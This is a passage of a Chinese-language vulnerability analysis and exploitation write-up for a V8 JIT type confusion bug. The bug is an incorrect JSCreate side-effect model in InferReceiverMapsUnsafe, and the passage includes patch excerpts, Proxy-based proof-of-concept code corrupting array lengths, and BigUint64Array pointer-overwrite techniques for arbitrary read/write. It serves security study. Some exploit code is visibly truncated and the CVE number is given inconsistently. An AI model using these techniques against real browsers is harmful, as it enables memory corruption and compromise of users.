      CHECK(feedback.IsValid());
      ZoneHandleSet maps;
      for (Handle map : maps_) maps.insert(map, jsgraph->graph()->zone());
      *effect = jsgraph->graph()->NewNode(
          jsgraph->simplified()->CheckMaps(CheckMapsFlag::kNone, maps, feedback),
          object_, *effect, control);
      SetGuarded();
    }
#### 漏洞分析
理解了上面说的`builtin inling`以后理解漏洞就很简单了。
根据`patch`，漏洞出现在`InferReceiverMapsUnsafe`中，相关代码如下：
    // compiler/node-properties.cc:337
    // static
    NodeProperties::InferReceiverMapsResult NodeProperties::InferReceiverMapsUnsafe(
        JSHeapBroker* broker, Node* receiver, Node* effect,
        ZoneHandleSet* maps_return) {
      HeapObjectMatcher m(receiver);
      ...
      InferReceiverMapsResult result = kReliableReceiverMaps;
      while (true) {
        switch (effect->opcode()) {
          case IrOpcode::kJSCreate: {
            if (IsSame(receiver, effect)) {
              base::Optional initial_map = GetJSCreateMap(broker, receiver);
              if (initial_map.has_value()) {
                *maps_return = ZoneHandleSet(initial_map->object());
                return result;
              }
              // We reached the allocation of the {receiver}.
              return kNoReceiverMaps;
            }
    +       result = kUnreliableReceiverMaps;  // JSCreate can have side-effect.
            break;
`patch`后的代码在`InferReceiverMapsUnsafe`函数中遍历到`kJSCreate`将类型赋值为`kUnreliableReceiverMaps`，即认为`JSCreate`可能会给当前对象的类型造成改变。
因此在漏洞版本的`v8`当中，代码认为`JSCreate`结点是不会改变当前的类型的类型的，即没有`side-effect`。而实际在poc中可以看到`Reflect.construct`转换成`JSCreate`结点，且它可以通过`Proxy`来触发回调函数来执行任意代码，当然也包括修改相应对象的类型，因此它是存在`side-effect`的。
正是对于`JSCreate`结点的`side-effect`判断错误，认为它没有`side-effect`，最终返回`kReliableReceiverMaps`。导致在`builtin
inlining`过程中`RelyOnMapsPreferStability`函数没有加入`CheckMaps`结点，但是仍然按之前的类型进行功能实现（实际类型已经发生改变），导致类型混淆漏洞的产生。
在`poc`函数中，`a.pop`函数是不需要参数的，但是将`Reflect.construct`作为它的参数目标是在`JSCreate`结点和`JSCall`结点之间生成一条`effect`链。
当然其他`builtin`函数的内联也会触发这个洞，这里的`array.prototype.pop`可以触发越界读；`array.protype.push`则可以触发越界写。
## 利用
因为`pointer
compression`的存在，不能像之前一样无脑通过`ArrayBuffer`来进行任意读写了。但是很容易想到的是可以通过改写数组结构体`elements`或`properties`指针的方式实现堆的`4GB`空间内任意相对地址读写；可以通过修改`ArrayBuffer`结构体的`backing_store`指针来实现绝对地址的读写。
### BigUint64Array对象介绍
在这里再介绍对象`BigUint64Array`的结构体，通过它我们既可以实现`4GB`堆空间内相对地址的读写；又可以实现任意绝对地址的读写。
示例代码如下：
    let aa = new BigUint64Array(4);
    aa[0] = 0x1122334455667788n;
    aa[1] = 0xaabbaabbccddccddn;
    aa[2] = 0xdeadbeefdeadbeefn;
    aa[3] = 0xeeeeeeeeffffffffn;
    %DebugPrint(aa);
    %SystemBreak();
运行后数据如下，需要关注的是它的`length`、`base_pointer`以及`external_pointer`字段。它们和之前的指针不一样，都是`64`字节表示，且没有任何的`tag`标志。
    pwndbg> job 0x179a080c6669
    0x179a080c6669: [JSTypedArray]
     - map: 0x179a08280671  [FastProperties]
     - prototype: 0x179a08242bc9 
     - elements: 0x179a080c6641  [BIGUINT64ELEMENTS]
     - embedder fields: 2
     - buffer: 0x179a080c6611 
     - byte_offset: 0
     - byte_length: 32
     - length: 4
     - data_ptr: 0x179a080c6648
       - base_pointer: 0x80c6641
       - external_pointer: 0x179a00000007
     - properties: 0x179a080406e9  {}
     - elements: 0x179a080c6641  {
               0: 1234605616436508552
               1: 12302614530665336029
               2: 16045690984833335023
               3: 17216961135748579327
     }
     - embedder fields = {
        0, aligned pointer: (nil)
        0, aligned pointer: (nil)
     }
     pwndbg> x/16wx 0x179a080c6668
    0x179a080c6668: 0x08280671      0x080406e9      0x080c6641      0x080c6611
    0x179a080c6678: 0x00000000      0x00000000      0x00000020      0x00000000
    0x179a080c6688: 0x00000004      0x00000000      0x00000007      0x0000179a  
    0x179a080c6698: 0x080c6641      0x00000000      0x00000000      0x00000000
    pwndbg> x/3gx 0x179a080c6688
    0x179a080c6688: 0x0000000000000004      0x0000179a00000007
    0x179a080c6698: 0x00000000080c6641
它的数据存储是在`data_ptr`中，`data_ptr`的表示是`base_pointer+external_pointer`：
    pwndbg> print 0x80c6641+0x179a00000007
    $171 = 0x179a080c6648
    pwndbg> x/4gx 0x179a080c6648
    0x179a080c6648: 0x1122334455667788      0xaabbaabbccddccdd
    0x179a080c6658: 0xdeadbeefdeadbeef      0xeeeeeeeeffffffff
`external_pointer`是高`32`位地址的值，`base_pointer`刚好就是相对于高`32`位地址的`4GB`堆地址的空间的偏移。初始时`external_pointer`的地址刚好是根寄存器`r13`的高`32`位。
因此我们可以通过覆盖`base_pointer`来实现`4GB`堆地址空间的任意读写；可以通过读取`external_pointer`来获取根的值；可以通过覆盖`external_pointer`和`base_pointer`的值来实现绝对地址的任意读写。
当然`Float64Array`以及`Uint32Array`的结构体差不多也是这样，但是使用`BigInt`还有一个好处就是它的数据的`64`字节就是我们写入的`64`字节，不像`float`或者是`int`一样还需要转换。
### 漏洞利用
有了上面的基础后就可以进行漏洞利用了。
首先是利用类型混淆实现将`float`数组的`length`字段覆盖称很大的值。通过前面我们可以知道`DOUBLE`数组`element`长度是`8`，而`object`数组长度是`4`。通过类型混淆在`Proxy`中将对象从`DOUBLE`数组变成`object`数组，在后续`pop`或者`push`的时候就会实现越界读写，控制好数组长度，并在后面布置数组的话，则可以刚好读写到后面数组的`length`字段，代码如下：
    const MAX_ITERATIONS = 0x10000;
    var maxSize = 1020*4;
    var vulnArray = [,,,,,,,,,,,,,, 1.1, 2.2, 3.3];
    vulnArray.pop();
    vulnArray.pop();
    vulnArray.pop();
    var oobArray;
    function empty() {}
    function evil(optional) {
        vulnArray.push(typeof(Reflect.construct(empty, arguments, optional)) === Proxy? 1.1: 8.063e-320);  // print (i2f(maxSize 8.063e-320
        for (let i=0; i {
            vulnArray[0] = {};
            oobArray = [1.1, 2.2];
            return Object.prototype;
        }
    });
    function VulnEntry(func) {
        for (let i=0; i (Object.prototype)
    });
    function main(p) {
      return f(p);
    }
    %PrepareFunctionForOptimization(empty);
    %PrepareFunctionForOptimization(f);
    %PrepareFunctionForOptimization(main);
    f(empty);
    f(empty);
    %OptimizeFunctionOnNextCall(f);
    print(f(p));
答案是不行的，将`poc`改成上面所示代码，是无法漏洞的。
经过分析，发现代码在`Reflect.construct`函数的内联处理函数`ReduceReflectConstruct`函数过程中会先将`JSCall`结点转换成`JSConstructWithArrayLike`结点。
    // compiler/js-call-reducer.cc:3906
    Reduction JSCallReducer::ReduceJSCall(Node* node,
                                          const SharedFunctionInfoRef& shared) {
        ...
      int builtin_id =
          shared.HasBuiltinId() ? shared.builtin_id() : Builtins::kNoBuiltinId;
      switch (builtin_id) {
        ...
        case Builtins::kReflectConstruct:
          return ReduceReflectConstruct(node);
    // compiler/js-call-reducer.cc:2841
    // ES6 section 26.1.2 Reflect.construct ( target, argumentsList [, newTarget] )
    Reduction JSCallReducer::ReduceReflectConstruct(Node* node) {
      ...
      NodeProperties::ChangeOp(node,
                               javascript()->ConstructWithArrayLike(p.frequency()));
      Reduction const reduction = ReduceJSConstructWithArrayLike(node);
      ...
    }
在`ReduceJSConstructWithArrayLike`函数中会调用`ReduceCallOrConstructWithArrayLikeOrSpread`函数。
在`ReduceCallOrConstructWithArrayLikeOrSpread`函数中如果发现目前优化的函数是最外层函数中的函数的话，则会将结点从`JSConstructWithArrayLike`转化成`JSCallForwardVarargs`结点，从而最终不会出现`JSCreate`结点。
    // compiler/js-call-reducer.cc:4681
    Reduction JSCallReducer::ReduceJSConstructWithArrayLike(Node* node) {
      ...
      return ReduceCallOrConstructWithArrayLikeOrSpread(
          node, 1, frequency, FeedbackSource(),
          SpeculationMode::kDisallowSpeculation, CallFeedbackRelation::kRelated);
    }
    // compiler/js-call-reducer.cc:3519
    Reduction JSCallReducer::ReduceCallOrConstructWithArrayLikeOrSpread(
      ...
      // 如果优化的函数已经是最外层函数中的函数
      // Check if are spreading to inlined arguments or to the arguments of
      // the outermost function.
      Node* outer_state = frame_state->InputAt(kFrameStateOuterStateInput);
      if (outer_state->opcode() != IrOpcode::kFrameState) {
        Operator const* op =
            (node->opcode() == IrOpcode::kJSCallWithArrayLike ||
             node->opcode() == IrOpcode::kJSCallWithSpread)
                ? javascript()->CallForwardVarargs(arity + 1, start_index)  // 转换成JSCallForwardVarargs结点
                : javascript()->ConstructForwardVarargs(arity + 2, start_index);
        NodeProperties::ChangeOp(node, op);
        return Changed(node);
      }
            ...
        NodeProperties::ChangeOp(
            node, javascript()->Construct(arity + 2, frequency, feedback));  // 否则转换成JSConstruct结点
        Node* new_target = NodeProperties::GetValueInput(node, arity + 1);
        Node* frame_state = NodeProperties::GetFrameStateInput(node);
        Node* context = NodeProperties::GetContextInput(node);
        Node* effect = NodeProperties::GetEffectInput(node);
        Node* control = NodeProperties::GetControlInput(node);
所以需要在最外面加一层`main`函数，绕过这个点，从而触发漏洞。
## 总结
通过应急响应这个`cve-2020-6148`漏洞，对于类型混淆漏洞原理进一步掌握，也是对于`pointer
compression`的进一步理解，也是对于新的内存机制下`v8`漏洞利用的学习，一举多得。
相关文件以及代码[链接](https://github.com/ray-cp/browser_pwn/tree/master/cve-2020-6418)
## 参考链接
  1. [Pointer Compression in V8](https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html)
  2. [V8 release v8.0](https://v8.dev/blog/v8-release-80)
  3. [Compressed pointers in V8](https://docs.google.com/document/d/10qh2-b4C5OtSg-xLwyZpEI5ZihVBPtn1xwKBbQC26yI/edit#heading=h.x1cv1fi5g42q)
  4. [Reflect.construct()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct)
  5. [Stable Channel Update for Desktop](https://chromereleases.googleblog.com/2020/02/stable-channel-update-for-desktop_24.html)
  6. [Trashing the Flow of Data](https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html)
  7. [BigUint64Array](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/BigUint64Array)
  8. [fb0a60e15695466621cf65932f9152935d859447](https://chromium.googlesource.com/v8/v8/+/fb0a60e15695466621cf65932f9152935d859447)
  9. [Fix bug in receiver maps inference](https://chromium-review.googlesource.com/c/v8/v8/+/2062396)
  10. [Security: Incorrect side effect modelling for JSCreate](https://bugs.chromium.org/p/chromium/issues/detail?id=1053604)
  11. [A EULOGY FOR PATCH-GAPPING CHROME](https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping/)
* * *